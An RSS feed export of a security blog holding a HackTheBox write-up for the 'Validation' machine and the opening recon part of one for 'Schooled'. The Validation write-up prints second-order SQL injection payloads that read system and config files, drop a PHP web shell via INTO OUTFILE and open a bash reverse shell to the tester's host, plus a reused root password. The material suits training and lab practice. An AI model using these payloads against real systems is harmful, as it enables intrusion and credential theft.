<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Password-reuse on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/password-reuse/</link>
    <description>Recent content in Password-reuse on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Fri, 24 Sep 2021 19:11:30 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/password-reuse/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Validation</title>
      <link>https://fahmifj.github.io/hackthebox/validation/</link>
      <pubDate>Fri, 24 Sep 2021 19:11:30 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/validation/</guid>
      <description>Second-order SQL injection</description>
      <content:encoded><![CDATA[<p><a href="https://app.hackthebox.eu/machines/Validation">Validation</a>  is another machine from the UHC event and is currently live on Hack The Box as a retired machine. It starts with enumeration on a website and identifying a second order SQL injection. The SQL user can use various SQL functions, two of which allow for file read and file write. The web configuration, which contains database credentials, can be read using the file read ability. With the file write ability and also write permission on the web root, it is possible to drop a web shell to gain a foothold on the system. For the root part, the password for the database is found to be re-used by the root account.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Web enumeration</li>
<li>SQL injection</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>All TCP ports scan with <code>nmap</code> discovers 4 open ports: SSH on 22, three web servers on 80, 4566 (probably LocalStack), and 8080.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «validation» «10.10.14.5» 
</span></span><span class="line"><span class="cl">$ fscan 10.10.11.116 validation
</span></span><span class="line"><span class="cl">nmap -p- 10.10.11.116 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
</span></span><span class="line"><span class="cl">nmap -p 22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080 -sC -sV -oA nmap/all-tcp-ports-validation 10.10.11.116
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-22 16:46 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.116
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.051s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE    SERVICE        VERSION
</span></span><span class="line"><span class="cl">22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp   open     http           Apache httpd 2.4.48 <span class="o">((</span>Debian<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.48 <span class="o">(</span>Debian<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
</span></span><span class="line"><span class="cl">4566/tcp open     http           nginx
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
</span></span><span class="line"><span class="cl">5000/tcp filtered upnp
</span></span><span class="line"><span class="cl">5001/tcp filtered commplex-link
</span></span><span class="line"><span class="cl">5002/tcp filtered rfe
</span></span><span class="line"><span class="cl">5003/tcp filtered filemaker
</span></span><span class="line"><span class="cl">5004/tcp filtered avt-profile-1
</span></span><span class="line"><span class="cl">5005/tcp filtered avt-profile-2
</span></span><span class="line"><span class="cl">5006/tcp filtered wsm-server
</span></span><span class="line"><span class="cl">5007/tcp filtered wsm-server-ssl
</span></span><span class="line"><span class="cl">5008/tcp filtered synapsis-edge
</span></span><span class="line"><span class="cl">8080/tcp open     http           nginx
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: <span class="m">502</span> Bad Gateway
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.07 seconds
</span></span></code></pre></div><p>The filtered ports indicate that there are some firewall/IP table rules applied on the machine.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Port 80 presents a registration page of UHC. Adding <code>index.php</code> reveals that it&rsquo;s PHP site.</p>
<p><div class="img-container"><img src="imgs/image-20210923035321832.png" alt="image-20210923035321832"  /></div>
</p>
<p>I can register on it, and it redirects to <code>/account.php</code>. The submitted inputs (country and username) are reflected back here, and this can be an indicator for injection point.</p>
<p><div class="img-container"><img src="imgs/image-20210923040838459.png" alt="image-20210923040838459"  /></div>
</p>
<p>The HTTP request for register, which was previously intercepted using Burp Suite, is as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">10.10.11.116</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">35</span>
</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://10.10.11.116</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://10.10.11.116/index.php</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">username=choropys&amp;country=Indonesia
</span></span></code></pre></div><p>And the server responses with <code>302</code> which redirects to <code>/account.php</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
</span></span><span class="line"><span class="cl"><span class="n">Date</span><span class="o">:</span> <span class="l">Wed, 22 Sep 2021 21:08:19 GMT</span>
</span></span><span class="line"><span class="cl"><span class="n">Server</span><span class="o">:</span> <span class="l">Apache/2.4.48 (Debian)</span>
</span></span><span class="line"><span class="cl"><span class="n">X-Powered-By</span><span class="o">:</span> <span class="l">PHP/7.4.23</span>
</span></span><span class="line"><span class="cl"><span class="n">Set-Cookie</span><span class="o">:</span> <span class="l">user=f1bffe3047f1550d765a66e3ac54515c</span>
</span></span><span class="line"><span class="cl"><span class="n">Location</span><span class="o">:</span> <span class="l">/account.php</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">0</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
</span></span></code></pre></div><p>The response also contains a cookie which is <code>md5sum</code> of the username.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «validation» «10.10.14.5» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> -n <span class="s1">&#39;choropys&#39;</span> <span class="p">|</span> md5sum                                                                 
</span></span><span class="line"><span class="cl">f1bffe3047f1550d765a66e3ac54515c
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="sql-injection">SQL injection</h3>
<h4 id="detection">Detection</h4>
<p>I will submit another registration request with the following payload,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">10.10.11.116</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="g">...[SNIP]...
</span></span></span><span class="line"><span class="cl"><span class="g">
</span></span></span><span class="line"><span class="cl"><span class="g">username=choropys&#39;&amp;country=Indonesia&#39;
</span></span></span></code></pre></div><p>Now when I navigate to <code>/account.php</code> with updated cookie, the page displays an error message.</p>
<p><div class="img-container"><img src="imgs/image-20210923041509664.png" alt="image-20210923041509664"  /></div>
</p>
<p>If I search for  <code>fetch_assoc()</code> on Google, it&rsquo;s a PHP function that typically used to handle database records.</p>
<p>Now if I change the <code>country</code>  value to <code>Indonesia' -- #</code> , the page doesn&rsquo;t error out. From here, I can assume that the site is vulnerable to SQL injection.</p>
<p><div class="img-container"><img src="imgs/image-20210923041604118.png" alt="image-20210923041604118"  /></div>
</p>
<p>I will submit <code>country=Indonesia'ORDER BY 1,2 -- #</code> to identify the number of available columns, and the <code>/account.php</code> page returns with the same error.</p>
<p><div class="img-container"><img src="imgs/image-20210923042953130.png" alt="image-20210923042953130"  /></div>
</p>
<p>So the query in the backend only wants a single column.</p>
<h4 id="leak-source">Leak source</h4>
<p>I couldn&rsquo;t find any credentials on the database, but I found out that the MySQL <code>load_file()</code> function isn&rsquo;t restricted. I can read the <code>/etc/passwd</code> file using that function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">username=choropys&amp;country=&#39;UNION SELECT load_file(&#39;/etc/passwd&#39;) -- #
</span></span></code></pre></div><p>When I refresh <code>/account.page</code></p>
<p><div class="img-container"><img src="imgs/image-20210923043603480.png" alt="image-20210923043603480"  /></div>
</p>
<p>Since the location of <code>account.php</code> has been leaked by the error message, I can try to load that file with <code>country='UNION SELECT load_file('/var/www/html/account.php') -- #</code>. When I refresh the <code>account.php</code> page and view its source, the source code of <code>account.php</code> is there, and it also leaks the configuration file.</p>
<p><div class="img-container"><img src="imgs/image-20210923044030733.png" alt="image-20210923044030733"  /></div>
</p>
<p>I can try to read <code>config.php</code> by changing my payload to <code>country='UNION SELECT load_file('/var/www/html/account.php') -- #</code>, and it reveals database credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210923044108761.png" alt="image-20210923044108761"  /></div>
</p>
<p>I will note these creds.</p>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="web-shell">Web shell</h4>
<p>I also find that writing files is allowed on <code>/var/www/html/</code>, therefore I could put a web shell there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">username=choropys&amp;country=&#39;UNION SELECT &#34;&lt;?php system($_REQUEST[c]); ?&gt;&#34; INTO OUTFILE &#34;/var/www/html/chrp.php&#34; -- #	
</span></span></code></pre></div><p>And now I have code execution.</p>
<p><div class="img-container"><img src="imgs/image-20210923045051661.png" alt="image-20210923045051661"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>The system does have bash, but my reverse shell doesn&rsquo;t work with the GET method, so I changed the request to use the POST method and URL encode the payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">c=/bin/bash+-c+&#34;/bin/bash+-i+&gt;%26+/dev/tcp/10.10.14.5/21+0&gt;%261&#34;
</span></span></code></pre></div><p>On my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «validation» «10.10.14.5» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">21</span>                                                
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">21</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.5<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.116<span class="o">]</span> <span class="m">37096</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">www-data@validation:/var/www/html$ id 
</span></span><span class="line"><span class="cl">id 
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span></code></pre></div><p>I will upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@validation:/var/www/html$ which script
</span></span><span class="line"><span class="cl">which script
</span></span><span class="line"><span class="cl">/usr/bin/script
</span></span><span class="line"><span class="cl">www-data@validation:/var/www/html$ script /dev/null -c bash
</span></span><span class="line"><span class="cl">script /dev/null -c bash
</span></span><span class="line"><span class="cl">Script started, output log file is <span class="s1">&#39;/dev/null&#39;</span>.
</span></span><span class="line"><span class="cl">www-data@validation:/var/www/html$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">113</span> suspended  nc -nvlp <span class="m">21</span>
</span></span><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">113</span> continued  nc -nvlp <span class="m">21</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">www-data@validation:/var/www/html$ 
</span></span></code></pre></div><p>The root flag is readable by others, so I could grab it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@validation:/home/htb$ ls -lR /home
</span></span><span class="line"><span class="cl">/home:
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Sep <span class="m">9</span> 12:09 htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/home/htb:
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">2</span> root root <span class="m">33</span> Sep <span class="m">22</span> 22:14 user.txt
</span></span></code></pre></div><p>I also noticed that I&rsquo;m inside a Docker container because there is <code>.dockerenv</code> at the root file system</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@validation:/$ ls -l .dockerenv
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">2</span> root root <span class="m">0</span> Sep <span class="m">16</span> 13:39 .dockerenv
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="su-root">su root</h4>
<p>In the previous enumeration using SQLi, I didn&rsquo;t see user <strong>htb</strong> listed in the <code>/etc/passwd</code> file, and it&rsquo;s only <strong>root</strong> that has a login shell. So I tried the database password I obtained from the <code>config.php</code> file on <strong>root</strong>, and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@validation:/$ su -   
</span></span><span class="line"><span class="cl">su -
</span></span><span class="line"><span class="cl">Password: uhc-9qual-global-pw
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root@validation:~# 
</span></span></code></pre></div><p>I thought I needed to escape from this container, but when I checked the <code>/root/</code> directory, the root flag was there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@validation:/# ls -l /root/root.txt 
</span></span><span class="line"><span class="cl">-r-------- <span class="m">2</span> root root <span class="m">33</span> Sep <span class="m">22</span> 22:14 root.txt
</span></span></code></pre></div><p>I also briefly thought that maybe a player had left a copy of the root flag of the host in this container. But, after I watched the <a href="https://www.youtube.com/watch?v=UqoVQ4dbYaI">official walkthrough</a> video by ippsec and read the <a href="https://0xdf.gitlab.io/2021/09/14/htb-validation.html">writeup</a> by 0xdf, the box ended this way 😅.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Schooled</title>
      <link>https://fahmifj.github.io/hackthebox/schooled/</link>
      <pubDate>Thu, 16 Sep 2021 18:22:05 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/schooled/</guid>
      <description>Moodle exploitation using CVEs</description>
      <content:encoded><![CDATA[<p>Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, thus allowing me to install a malicious plugin to gain interactive shell access to the system. Internal enumeration reveals database credentials which can be used to recover a password from the database. The password is reused by one of the users for SSH login. This user is allowed to install FreeBSD packages with <code>sudo</code> permissions, and it can be exploited to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Stealing cookie with XSS</li>
<li>Moodle exploitation</li>
<li>Sudo exploitation on <code>pkg</code></li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full scan with nmap discovers three open ports: SSH on 22, an Apache web server on port 80 and a service that <code>nmap</code> identifies it as mysqlx.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-schooled 10.10.10.234
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-17 14:34 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.234
</span></span><span class="line"><span class="cl">Host is up, received reset ttl <span class="m">63</span> <span class="o">(</span>0.045s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65532</span> resets
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE REASON         VERSION
</span></span><span class="line"><span class="cl">22/tcp    open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 7.9 <span class="o">(</span>FreeBSD 20200214<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp    open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
</span></span><span class="line"><span class="cl">33060/tcp open  mysqlx? syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl">SF-Port33060-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>5/17%Time<span class="o">=</span>60A2BA63%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>N
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">Service Info: OS: FreeBSD<span class="p">;</span> CPE: cpe:/o:freebsd:freebsd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 801.40 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---schooledhtb">TCP 80 - schooled.htb</h3>
<p>Port 80 serving a homepage of a school institution.</p>
<p><div class="img-container"><img src="imgs/image-20210518035709619.png" alt="image-20210518035709619"  /></div>
</p>
<p>In the About section, it states that this school has an online learning system using Moodle.</p>
<p><div class="img-container"><img src="imgs/image-20210518041407775.png" alt="image-20210518041407775"  /></div>
</p>
<p>The Teachers section displays the teachers of the school. This can be useful for generating username list.</p>
<p><div class="img-container"><img src="imgs/image-20210518035931687.png" alt="image-20210518035931687"  /></div>
</p>
<p>On the Contact section, there is an input form. The form submit button points to <code>/contact.php</code>, but it returns with 404.</p>
<p>At the bottom of the site, it reveals an email address and a domain name: <code>schooled.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210518035750397.png" alt="image-20210518035750397"  /></div>
</p>
<p>I will update my <code>/etc/hosts</code> with that domain name.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb&#39;</span> &gt;&gt; /etc/hosts/
</span></span></code></pre></div><p>Poking back the site with <code>curl</code> using its domain name reveals that it&rsquo;s the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$  curl -s http://10.10.10.234/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">20750</span>
</span></span><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s http://schooled.htb/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">20750</span>
</span></span></code></pre></div><h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
<p>Enumerating subdomain using <code>gobuster</code> reveals that there is one called <code>moodle.schooled.htb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ gobuster vhost -u <span class="s1">&#39;http://schooled.htb/&#39;</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:          http://schooled.htb/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:       GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:      <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:   gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:      <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/05/17 17:11:00 Starting gobuster in VHOST enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Found: moodle.schooled.htb <span class="o">(</span>Status:  200<span class="o">)</span> <span class="o">[</span>Size: 84<span class="o">]</span>
</span></span></code></pre></div><p>I will update <code>/etc/hosts</code> again.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb moodle.schooled.htb&#39;</span>
</span></span></code></pre></div><p>And it&rsquo;s different site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s http://moodle.schooled.htb/ <span class="p">|</span> wc -c <span class="o">&amp;&amp;</span> curl -s http://schooled.htb <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">84</span>
</span></span><span class="line"><span class="cl"><span class="m">20750</span>
</span></span></code></pre></div><h3 id="tcp-80---moodleschooledhtb">TCP 80 - moodle.schooled.htb</h3>
<p>Heading to <code>moodle.schooled.htb</code> shows that it&rsquo;s <a href="https://moodle.org/">Moodle LMS</a>, and there are four courses available here.</p>
<p><div class="img-container"><img src="imgs/image-20210518171919132.png" alt="image-20210518171919132"  /></div>
</p>
<p>It allows guest login, but nothing much I can do with that, so I will just register an account.</p>
<h4 id="account-register">Account Register</h4>
<p>To register an account I have to use the domain <code>student.schooled.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210518173537504.png" alt="image-20210518173537504"  /></div>
</p>
<p>I will change my email domain and login afterwards.</p>
<p>When I visit the domain <code>student.schooled.htb</code>, it returns the same site as <code>schooled.htb</code>.</p>
<h4 id="enroll-course">Enroll course</h4>
<p>Based on the login activity,  Manuel Phillips is the only teacher that seems to be active. So I will enroll to his course (it allows self-enroll).</p>
<p><div class="img-container"><img src="imgs/image-20210518174336502.png" alt="image-20210518174336502"  /></div>
</p>
<p>On the Mathematics course, there are two announcements .</p>
<p><div class="img-container"><img src="imgs/image-20210518175011420.png" alt="image-20210518175011420"  /></div>
</p>
<p>The oldest announcement by Jamie Borham is just a welcome message and the other titled &ldquo;Reminder for joining students&rdquo; by Manuel Phillips is a reminder for the students to set their MoodleNet profiles.</p>
<p><div class="img-container"><img src="imgs/image-20210518175100601.png" alt="image-20210518175100601"  /></div>
</p>
<p>The &ldquo;MoodleNet profile&rdquo; that Manuel Phillips was talking about can be found at <code>Dashboard -&gt; Preferences -&gt; User account -&gt; Edit profile</code> .</p>
<p><div class="img-container"><img src="imgs/image-20210518183135218.png" alt="image-20210518183135218"  /></div>
</p>
<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
<h4 id="exploit-db">Exploit-DB</h4>
<p>At that time, I didn&rsquo;t know how to determine the Moodle version, so I started to search the Moodle vulnerabilities on Exploit-DB using keyword <code>Moodle</code> and sorted the results by latest, here are some potential public exploits I found:</p>
<ul>
<li>Moodle 3.10.3 - &lsquo;url&rsquo; Persistent Cross Site Scripting =&gt; Need a teacher or an administrator or a manager role.</li>
<li>Moodle 3.10.3 - &rsquo;label&rsquo; Persistent Cross Site Scripting =&gt; Worth to try.</li>
</ul>
<p><div class="img-container"><img src="imgs/image-20210518183748916.png" alt="image-20210518183748916"  /></div>
</p>
<h4 id="moodle-security">Moodle Security</h4>
<p>The other place to look for the Moodle vulnerabilities/security issues is on  <a href="https://moodle.org/security/">https://moodle.org/security/</a>. In there, I find one stored XSS that seems interesting because it contains &ldquo;moodlenetprofile&rdquo; in its title.</p>
<p><div class="img-container"><img src="imgs/image-20210518220404280.png" alt="image-20210518220404280"  /></div>
</p>
